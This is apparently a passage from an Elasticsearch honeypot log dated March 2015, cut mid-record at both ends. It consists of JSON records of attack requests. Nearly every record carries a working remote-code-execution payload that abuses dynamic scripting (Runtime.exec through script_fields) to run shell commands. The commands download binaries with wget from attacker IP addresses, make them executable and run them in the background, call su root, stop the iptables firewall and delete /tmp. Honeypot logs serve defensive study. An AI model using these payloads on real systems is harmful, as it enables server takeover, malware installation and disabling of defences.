    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22su+root%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.31.83",
    "@timestamp": "2015-03-23T04:57:20.570862089Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22chmod%20777%20%2Ftmp%2Fxiaoma1%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22chmod+777+%2Ftmp%2Fxiaoma1%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.31.83",
    "@timestamp": "2015-03-23T04:57:25.873825352Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22nohup%20%2Ftmp%2Fxiaoma1%20%3E%20%2Fdev%2Fnull%202%3E%261%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22nohup+%2Ftmp%2Fxiaoma1+%3E+%2Fdev%2Fnull+2%3E%261%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.31.83",
    "@timestamp": "2015-03-23T04:57:31.171908761Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22%2Ftmp%2Fxiaoma1%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22%2Ftmp%2Fxiaoma1%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.31.83",
    "@timestamp": "2015-03-23T04:57:36.583174418Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22.%2Ftmp%2Fxiaoma1%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22.%2Ftmp%2Fxiaoma1%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.31.83",
    "@timestamp": "2015-03-23T04:57:41.984217273Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22wget%20-O%20%2Ftmp%2Fxiaoma2%20http%3A%2F%2F222.186.31.83%3A8080%2Fxiaoma2%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22wget+-O+%2Ftmp%2Fxiaoma2+http%3A%2F%2F222.186.31.83%3A8080%2Fxiaoma2%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.31.83",
    "@timestamp": "2015-03-23T04:57:47.369821085Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22su%20root%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22su+root%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.31.83",
    "@timestamp": "2015-03-23T04:57:52.76056614Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22chmod%20777%20%2Ftmp%2Fxiaoma2%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22chmod+777+%2Ftmp%2Fxiaoma2%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.31.83",
    "@timestamp": "2015-03-23T04:57:58.20518064Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22nohup%20%2Ftmp%2Fxiaoma2%20%3E%20%2Fdev%2Fnull%202%3E%261%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22nohup+%2Ftmp%2Fxiaoma2+%3E+%2Fdev%2Fnull+2%3E%261%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.31.83",
    "@timestamp": "2015-03-23T04:58:03.526805353Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22%2Ftmp%2Fxiaoma2%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22%2Ftmp%2Fxiaoma2%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.31.83",
    "@timestamp": "2015-03-23T04:58:08.870280371Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22.%2Ftmp%2Fxiaoma2%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22.%2Ftmp%2Fxiaoma2%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "61.160.232.202",
    "@timestamp": "2015-03-23T10:06:55.181724552Z",
    "url": "x.x.x.x:9200/_search?pretty",
    "method": "post",
    "form": "pretty=",
    "payload": "{\"size\":1,\"script_fields\": {\"exp\": {\"script\":\"java.lang.Math.class.forName(\\\"java.io.BufferedReader\\\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\\\"java.io.InputStreamReader\\\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"echo qq952135763\\\").getInputStream())).readLines()\",\"lang\": \"groovy\"}}}",
    "headers": {
        "user_agent": "Java/1.8.0_31",
        "host": "x.x.x.x:9200",
        "content_type": "application/x-www-form-urlencoded",
        "accept_language": "zh-CN"
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.31.182",
    "@timestamp": "2015-03-23T12:46:57.090263558Z",
    "url": "x.x.x.x:9200/_search?pretty",
    "method": "post",
    "form": "pretty=",
    "payload": "{\"size\":1,\"script_fields\": {\"exp\": {\"script\":\"java.lang.Math.class.forName(\\\"java.io.BufferedReader\\\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\\\"java.io.InputStreamReader\\\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"echo qq952135763\\\").getInputStream())).readLines()\",\"lang\": \"groovy\"}}}",
    "headers": {
        "user_agent": "Java/1.8.0_31",
        "host": "x.x.x.x:9200",
        "content_type": "application/x-www-form-urlencoded",
        "accept_language": "zh-CN"
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "120.26.38.211",
    "@timestamp": "2015-03-23T14:19:22.5959979Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22query%22%3A+%7B%22filtered%22%3A+%7B%22query%22%3A+%7B%22match_all%22%3A+%7B%7D%7D%7D%7D%2C+%22script_fields%22%3A+%7B%22exp%22%3A+%7B%22script%22%3A+%22import+java.util.%2A%3Bimport+java.io.%2A%3BString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22wget+-O+%2Ftmp%2Flinx1+http%3A%2F%2F120.26.38.211%3A208%2Flinx1%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3Bsb.append%28%5C%22%5Cr%5Cn%5C%22%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%2C+%22size%22%3A+1%7D",
    "method": "GET",
    "form": "source=%7B%22query%22%3A+%7B%22filtered%22%3A+%7B%22query%22%3A+%7B%22match_all%22%3A+%7B%7D%7D%7D%7D%2C+%22script_fields%22%3A+%7B%22exp%22%3A+%7B%22script%22%3A+%22import+java.util.%2A%3Bimport+java.io.%2A%3BString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22wget+-O+%2Ftmp%2Flinx1+http%3A%2F%2F120.26.38.211%3A208%2Flinx1%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3Bsb.append%28%5C%22%5Cr%5Cn%5C%22%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%2C+%22size%22%3A+1%7D",
    "payload": "",
    "headers": {
        "user_agent": "python-requests/2.4.1 CPython/2.7.8 Windows/2003Server",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "60.169.80.122",
    "@timestamp": "2015-03-23T14:22:59.678553376Z",
    "url": "x.x.x.x:9200/_search?pretty",
    "method": "post",
    "form": "pretty=",
    "payload": "{\"size\":1,\"script_fields\": {\"exp\": {\"script\":\"java.lang.Math.class.forName(\\\"java.io.BufferedReader\\\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\\\"java.io.InputStreamReader\\\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"echo qq952135763\\\").getInputStream())).readLines()\",\"lang\": \"groovy\"}}}",
    "headers": {
        "user_agent": "Java/1.8.0_31",
        "host": "x.x.x.x:9200",
        "content_type": "application/x-www-form-urlencoded",
        "accept_language": "zh-CN"
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.15.246",
    "@timestamp": "2015-03-23T14:39:04.178116492Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22service%20iptables%20stop%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22service+iptables+stop%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.15.246",
    "@timestamp": "2015-03-23T14:39:04.907616354Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22rm%20-r%20%2Ftmp%2F%2A%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22rm+-r+%2Ftmp%2F%2A%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.15.246",
    "@timestamp": "2015-03-23T14:39:10.332548228Z",
